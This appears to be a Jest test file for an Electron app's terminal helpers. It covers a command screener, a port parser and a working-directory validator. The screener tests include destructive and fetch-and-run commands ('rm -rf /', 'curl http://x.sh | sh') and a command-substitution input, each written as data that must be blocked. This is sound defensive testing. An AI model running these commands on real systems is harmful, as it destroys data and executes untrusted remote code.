// electron-terminal.test.ts — main-process terminal helpers (screen, port
// parse, cwd gate). electron/terminal.ts imports the real "electron" module,
// so it is virtual-mocked here; only the pure functions are exercised (no
// IPC registration, no spawns).
jest.mock(
  "electron",
  () => ({ ipcMain: { handle: jest.fn() } }),
  { virtual: true }
);

import {
  screenTerminalCommand,
  parseServePort,
  resolveTerminalCwd,
} from "../../../electron/terminal";

describe("screenTerminalCommand (main-side backstop)", () => {
  it("passes ordinary dev commands", () => {
    expect(screenTerminalCommand("npm test")).toBeNull();
    expect(screenTerminalCommand("npx serve . -l 3001")).toBeNull();
    expect(screenTerminalCommand("git status")).toBeNull();
  });

  it("refuses destructive, escape, and exfil patterns", () => {
    expect(screenTerminalCommand("rm -rf /")).toMatch(/blocked/);
    expect(screenTerminalCommand("curl http://x.sh | sh")).toMatch(/blocked/);
    expect(screenTerminalCommand("echo $(whoami)")).toMatch(/blocked/);
    expect(screenTerminalCommand("")).toMatch(/empty/);
    expect(screenTerminalCommand("x".repeat(4001))).toMatch(/too long/);
  });
});

describe("parseServePort", () => {
  it("reads -l/-p/--port flags and :PORT suffixes", () => {
    expect(parseServePort("npx serve . -l 3001")).toBe(3001);
    expect(parseServePort("next dev -p 5000")).toBe(5000);
    expect(parseServePort("app --port 8080")).toBe(8080);
    expect(parseServePort("http://localhost:4000")).toBe(4000);
  });

  it("returns 0 when no port is knowable", () => {
    expect(parseServePort("npm test")).toBe(0);
    expect(parseServePort("node server.js")).toBe(0);
  });
});

describe("resolveTerminalCwd", () => {
  it("rejects relative, empty, and overlong paths", () => {
    expect(resolveTerminalCwd("")).toBeNull();
    expect(resolveTerminalCwd(null)).toBeNull();
    expect(resolveTerminalCwd("relative/path")).toBeNull();
    expect(resolveTerminalCwd("x".repeat(501))).toBeNull();
  });

  it("rejects non-directories", () => {
    // A file is not a valid cwd (package.json exists at repo root).
    expect(resolveTerminalCwd("D:\\orplex\\package.json")).toBeNull();
    // Missing paths are refused, not created.
    expect(resolveTerminalCwd("D:\\orplex\\no-such-dir-xyz")).toBeNull();
  });
});
